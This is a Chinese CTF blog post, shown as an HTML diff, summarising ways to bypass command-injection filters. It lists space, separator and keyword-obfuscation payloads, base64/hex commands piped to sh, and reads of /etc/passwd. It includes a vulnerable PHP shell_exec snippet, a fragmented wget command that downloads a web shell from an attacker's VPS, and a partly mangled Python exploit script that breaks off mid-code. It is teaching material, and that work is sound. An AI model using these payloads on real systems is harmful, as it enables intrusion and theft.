@@ -1,0 +1,1444 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+    
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="初级命令执行绕过总结, Liloong3t&#39;s Blog">
+    <meta name="baidu-site-verification" content="code-5WkfinfGVW">
+    <!-- <meta name="google-site-verification" content="" /> -->
+    <meta name="description" content="绕过空格过滤${IFS} $IFS$9
+$IFS$1$IFS在linux下表示分隔符，单纯的cat$IFSxxx，bash解释器会把整个IFSxxx当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>初级命令执行绕过总结 | Liloong3t&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/lightgallery/1.6.12/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <style type="text/css">
+        
+    </style>
+
+    <script src="https://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    <!-- 
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+     -->
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+    <body>
+
+        <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Liloong3t's Blog</span>
+                </a>
+            </div>
+            
+
+
+<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/AV" class="waves-effect waves-light">
+            
+            <i class="fa fa-music"></i>
+            
+            <span>视听</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/galleries" class="waves-effect waves-light">
+            
+            <i class="fa fa-photo"></i>
+            
+            <span>相册</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-envelope"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul> -->
+
+<!-- 支持二级菜单特性  modify 2019.09.17  -->
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/" class="waves-effect waves-light">
+              
+                <i class="fa fa-home"></i>
+              
+              <span>首页</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/tags" class="waves-effect waves-light">
+              
+                <i class="fa fa-tags"></i>
+              
+              <span>标签</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/categories" class="waves-effect waves-light">
+              
+                <i class="fa fa-bookmark"></i>
+              
+              <span>分类</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/archives" class="waves-effect waves-light">
+              
+                <i class="fa fa-archive"></i>
+              
+              <span>归档</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/AV" class="waves-effect waves-light">
+              
+                <i class="fa fa-music"></i>
+              
+              <span>视听</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/galleries" class="waves-effect waves-light">
+              
+                <i class="fa fa-photo"></i>
+              
+              <span>相册</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/about" class="waves-effect waves-light">
+              
+                <i class="fa fa-user-circle-o"></i>
+              
+              <span>关于我</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/contact" class="waves-effect waves-light">
+              
+                <i class="fa fa-envelope"></i>
+              
+              <span>留言板</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/friends" class="waves-effect waves-light">
+              
+                <i class="fa fa-address-book"></i>
+              
+              <span>友情链接</span>
+            </a>
+
+            
+      </li>
+    
+
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Liloong3t's Blog</div>
+        <div class="logo-desc">
+            
+            武汉科技大学 | 计算机科学与技术 | 信息安全
+            
+        </div>
+    </div>
+
+    
+
+    <!-- <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/AV" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-music"></i>
+                
+                视听
+            </a>
+        </li>
+        
+        <li>
+            <a href="/galleries" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-photo"></i>
+                
+                相册
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-envelope"></i>
+                
+                留言
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友链
+            </a>
+        </li>
+        
+        
+    </ul> -->
+
+   
+   
+<!-- 支持二级菜单特性  modify 2019.09.17  -->
+<ul class="menu-list mobile-menu-list">
+    
+        <li class="m-nav-item">
+                
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-home"></i>
+                        
+                        首页
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/tags" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-tags"></i>
+                        
+                        标签
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/categories" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-bookmark"></i>
+                        
+                        分类
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/archives" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-archive"></i>
+                        
+                        归档
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/AV" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-music"></i>
+                        
+                        视听
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/galleries" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-photo"></i>
+                        
+                        相册
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/about" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-user-circle-o"></i>
+                        
+                        关于我
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/contact" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-envelope"></i>
+                        
+                        留言
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/friends" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-address-book"></i>
+                        
+                        友链
+                    </a>
+              
+            </li>
+        
+
+        
+    </ul>
+
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        初级命令执行绕过总结
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/" target="_blank">
+                                <span class="chip bg-color">RCE</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/blog/" class="post-category" target="_blank">
+                                blog
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-02-25
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                        Liloong3t
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.7k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        7 分
+                    </div>
+                    
+                
+                
+                
+
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h2><pre><code>${IFS} </code></pre><pre><code>$IFS$9
+$IFS$1</code></pre><p>$IFS在linux下表示分隔符，单纯的cat$IFSxxx，bash解释器会把整个IFSxxx当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，为什么要用$9呢？因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。$1同理</p>
+<pre><code>&lt;</code></pre><pre><code>&lt;&gt;</code></pre><p>上面这俩也可以当空格使用</p>
+<pre><code>{cat,flag.php}  //用逗号实现空格功能，需要用{}括起来</code></pre><pre><code>%20
+%09</code></pre><p>如果命令执行环境是php环境，就可以使用%09替换空格符</p>
+<p>对于 &gt;,+ 等 符号的过滤</p>
+<pre><code>$PS2代替&gt;
+$PS4代替+</code></pre><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><p>先说最常规的</p>
+<pre><code>; </code></pre><p>表示顺序地独立执行各条命令， 彼此之间不关心是否失败， 所有命令都会执行</p>
+<pre><code>&amp;</code></pre><p> 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;</p>
+<pre><code>&amp;&amp;</code></pre><p> 表示前一条命令执行成功时，才执行后一条命令 ，如 echo ‘1‘ &amp;&amp; echo ‘2’</p>
+<pre><code>| </code></pre><p>表示管道，上一条命令的输出，作为下一条命令参数，如 echo ‘yes’ | wc -l</p>
+<pre><code>|| </code></pre><p>表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo “fail”</p>
+<p>在php环境下，也有url编码的符号可以代替分隔符</p>
+<pre><code>%0a        //换行符，即\n
+%0d        //回车符，即\r</code></pre><h2 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h2><p>php环境中</p>
+<pre><code>%00 
+
+%20#</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p><strong>连接符</strong></p>
+<pre><code>··         //这是反引号，就是键盘esc下面那个
+/</code></pre><p>如果过滤的不严就可以用这俩填充到字符串中间来绕过黑名单</p>
+<pre><code>wh\o\ami    //反斜线绕过
+who"a"mi    //双引号绕过
+whoa'm'i    //单引号绕过
+whoam``i    //反引号绕过
+
+echo d2hvYW1p|base64 -d|sh  //base64绕过,其中d2hvYW1p是whoami的base64编码
+echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码
+`echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令
+echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码
+
+//$*和$@，$x (x为1-9),${x}(x&gt;=10) :比如ca${21}t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:
+
+wh$1oami
+who$@ami
+whoa$*mi</code></pre><pre><code>还有一种骚操作
+666`whoami`666      //bash: 666root666: command not found
+666`\whoami`666     //bash: 666root666: command not found
+//命令执行后的结果在2个666中间</code></pre><pre><code>w`f1hgb`ho`f1hgb`am`f1hgb`i     //反引号的作用是把括起来的字符当做命令执行
+w`\f1hgb`ho`\f1hgb`am`\f1hgb`i  //这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行
+wh$(f1hgb)oa$(f1hgb)mi            //和上面的差不多,都是执行和拼接</code></pre><p><strong>拼接变量</strong></p>
+<p>linux系统中可以把字符变量拼接起来当作命令执行</p>
+<pre><code>a=l;b=s;$a$b        //这就相当于先给a、b赋值，然后拼接成 ls 命令</code></pre><p>还可以从字符串变量中取一部分字符出来用于拼接</p>
+<pre><code>a=fly;b=age;        //可以用两种方式拼接出flag字符
+${a:0:1}${a:1:1}${b:0:1}${b:1:1}
+或者
+${a:0:2}${b:0:2}
+都可以表示"flag"</code></pre><p>第一个冒号: 后的数字代表截取开始的位置，第二个冒号后的代表截取的字符数</p>
+<p>而Linux是有环境变量的，从而</p>
+<p><strong>利用Linux的环境变量</strong></p>
+<pre><code>echo ${PATH}   
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+echo ${PATH:1:9}
+usr/local</code></pre><p>所以,我们可以通过截断和拼接来得到我们想要的来getshell</p>
+<pre><code>${PATH:5:1}    
+//l
+${PATH:2:1}    
+//s${PATH:5:1}
+${PATH:2:1} 
+//拼接后是ls,执行命令
+${PATH:5:1}s           
+//拼接后是ls,执行命令</code></pre><h2 id="文件名绕过"><a href="#文件名绕过" class="headerlink" title="文件名绕过"></a>文件名绕过</h2><pre><code>cat fl[abc]g.php                                 //匹配[abc]中的任何一个
+cat f[a-z]ag.txt                                 //匹配a-z范围的任何字符
+cat fla*                                         //用*匹配任意
+a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php       //内联执行</code></pre><pre><code>利用正则:比如要读取etc/passwd
+cat /???/??????
+cat /???/pass*
+cat /etc$u/passwd</code></pre><h2 id="命令执行函数绕过"><a href="#命令执行函数绕过" class="headerlink" title="命令执行函数绕过"></a>命令执行函数绕过</h2><p>这里只举例<code>system()</code></p>
+<pre><code>system("cat /etc/passwd")
+=
+"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");
+=
+(sy.(st).em)("cat /etc/passwd");
+=
+//还可以用注释方法绕过
+"system/*fthgb666*/("cat /etc/passwd);"
+=
+"system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);"
+=
+"(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);"</code></pre><h2 id="限制字数的命令执行"><a href="#限制字数的命令执行" class="headerlink" title="限制字数的命令执行"></a>限制字数的命令执行</h2><p><strong>linux下创建文件的命令可以用1&gt;1创建文件名为1的空文件</strong></p>
+<p>a&gt;1也可以，虽然会报错，但是还是可以创建空文件。</p>
+<p>ls&gt;1可以直接把把ls的内容导入一个文件中,但是会默认追加\n，</p>
+<p>但是shell脚本里面是支持用转义字符转移换行符的 , 所以虽然命令被分解到了每一行 , 但是被转义了以后就相当于是一条命令了</p>
+<pre><code>&lt;?php
+if(strlen($_GET[1])&lt;8){
+     echo shell_exec($_GET[1]);
+}
+?&gt;</code></pre><p>简单的代码，可以利用</p>
+<pre><code>1&gt;wget\
+1&gt;你的vps域名.\
+1&gt;com\
+1&gt;-O\
+1&gt;she\
+1&gt;ll.p\
+1&gt;hp        //这里可以拼接成任何你想执行的命令，上面这是从你的vps上下载一个shell.php来: wget xxx.com -O shell.php
+ls&gt;a
+sh a</code></pre><p>这里注意’.’不能作为文件名的开头，因为linux下’.’是隐藏文件的开头，ls列不出来，需要ls -a</p>
+<p>然而这里还有个问题，就是ls下的文件名是按照字母顺序排序的，所以需要基于时间排序</p>
+<pre><code>把ls&gt;a
+改成
+ls -t&gt;a</code></pre><p>附上大佬的详解</p>
+<p><img src="/img/image-20210225231156002.png" alt="image-20210225231156002"></p>
+<p>图片中的脚本</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python </span>
+ <span class="token keyword">import</span> requests
+ <span class="token keyword">import</span> base64 
+ url <span class="token operator">=</span> <span class="token string">"https://web2.sniperoj.cn:10008/"</span> 
+ <span class="token keyword">def</span> <span class="token function">add_slashes</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"\\."</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"\\\\"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"\\/"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"\\|"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"\\&amp;"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"\\-"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"\\&lt;"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"\\>"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"\\#"</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"\\ "</span><span class="token punctuation">)</span> 
+     cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"\\="</span><span class="token punctuation">)</span> 
+     <span class="token keyword">return</span> cmd 
+<span class="token keyword">def</span> <span class="token function">exec_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> max_length<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    <span class="token keyword">print</span> <span class="token string">"[+] cmd : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> 
+    cmd <span class="token operator">=</span> add_slashes<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> 
+    <span class="token keyword">print</span> <span class="token string">"[+] Full cmd : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> 
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token operator">&lt;</span> max_length<span class="token punctuation">:</span> 
+        <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1135</span> <span class="token operator">-</span> <span class="token number">57</span><span class="token punctuation">]</span> every_length <span class="token operator">=</span> max_length <span class="token operator">-</span> len<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span> <span class="token operator">-</span> len<span class="token punctuation">(</span><span class="token string">"\\\\"</span><span class="token punctuation">)</span> 
+    times <span class="token operator">=</span> len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token operator">/</span> every_length 
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> times <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+        index <span class="token operator">=</span> i <span class="token operator">*</span> every_length <span class="token operator">-</span> <span class="token number">1</span> 
+        <span class="token keyword">if</span> cmd<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"\\"</span><span class="token punctuation">:</span> 
+            cmd <span class="token operator">=</span> cmd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> cmd<span class="token punctuation">[</span>index<span class="token punctuation">:</span><span class="token punctuation">]</span> 
+            cmds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> 
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>times<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+                every <span class="token operator">=</span> cmd<span class="token punctuation">[</span>every_length <span class="token operator">*</span> i<span class="token punctuation">:</span>every_length <span class="token operator">*</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> 
+                true_cmd <span class="token operator">=</span> <span class="token string">">%s\\\\"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>every<span class="token punctuation">)</span> 
+                cmds<span class="token punctuation">.</span>append<span class="token punctuation">(</span>true_cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token string">"\\\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+                end_cmd <span class="token operator">=</span> <span class="token string">">%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">[</span>times <span class="token operator">*</span> every_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
+                <span class="token keyword">if</span> len<span class="token punctuation">(</span>end_cmd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> 
+                    cmds<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> cmds<span class="token punctuation">.</span>append<span class="token punctuation">(</span>end_cmd<span class="token punctuation">)</span> 
+                    <span class="token keyword">for</span> i <span class="token keyword">in</span> cmds<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> 
